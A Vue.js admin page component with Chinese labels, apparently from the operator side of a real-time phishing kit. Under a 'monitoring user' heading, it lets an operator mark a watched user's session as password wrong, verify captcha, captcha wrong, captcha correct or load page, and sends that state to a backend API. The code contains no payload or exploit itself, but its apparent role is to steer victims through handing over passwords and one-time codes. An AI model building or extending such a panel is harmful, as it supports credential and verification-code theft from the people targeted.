<template>
  <div>
    <van-nav-bar
      title="修改状态"
      left-text="返回"
      right-text=""
      left-arrow
      @click-left="onClickLeft"
      @click-right="onClickRight"
    />

    <h1>正在监控用户</h1>
    <p>{{this.$route.query.info}}</p>

    <select  v-model="state">
        <option value="1">密码错误</option>
        <option value="2">验证验证码</option>
        <option value="3">验证码错误</option>
        <option value="4">验证码正确</option>
        <option value="5">加载页面</option>
    </select>

      <div style="margin: 16px">
        <van-button
          round
          block
          type="info"
          @click="addAdmin"
          native-type="submit"
          >修改状态</van-button
        >
      </div>
    <!-- </van-form> -->
  </div>
</template>

<script>
// 这里可以导入其他文件（比如：组件，工具js，第三方插件js，json文件，图片文件等等）
import user from "@/api/user";
import { Dialog } from "vant";
import { Toast } from "vant";

export default {
  // 组件注册
  components: {},
  // 定义属性
  data() {
    return {
      username: "",
      state: "",
      [Dialog.Component.name]: Dialog.Component,
    };
  },
  // 计算属性，会监听依赖属性值随之变化
  computed: {},
  // 监控data中的数据变化
  watch: {},
  // 方法集合
  methods: {
    addAdmin() {

      Dialog.confirm({
        title: "提示",
        message: "确认要修改状态吗？",
      })
        .then(() => {
          // on confirm
          // 添加管理员AXIOS操作
          user.updateOK(this.$route.query.id, this.state).then((res) => {
            if (res.code == "200") {
                Toast.success('成功');
                this.$router.push("/userManager")
            }
          });
        })
        .catch(() => {
          // on cancel
        });
    },
    onClickLeft() {
      this.$router.push("/userManager");
    },
    onClickRight() {
      Toast("按钮");
    },
  },
  // 生命周期 - 创建完成（可以访问当前this实例）
  created() {},
  // 生命周期 - 挂载完成（可以访问DOM元素）
  mounted() {},
  beforeCreate() {}, // 生命周期 - 创建之前
  beforeMount() {}, // 生命周期 - 挂载之前
  beforeUpdate() {}, // 生命周期 - 更新之前
  updated() {}, // 生命周期 - 更新之后
  beforeDestroy() {}, // 生命周期 - 销毁之前
  destroyed() {}, // 生命周期 - 销毁完成
  activated() {}, // 如果页面有keep-alive缓存功能，这个函数会触发
};
</script>

<style scoped>
</style>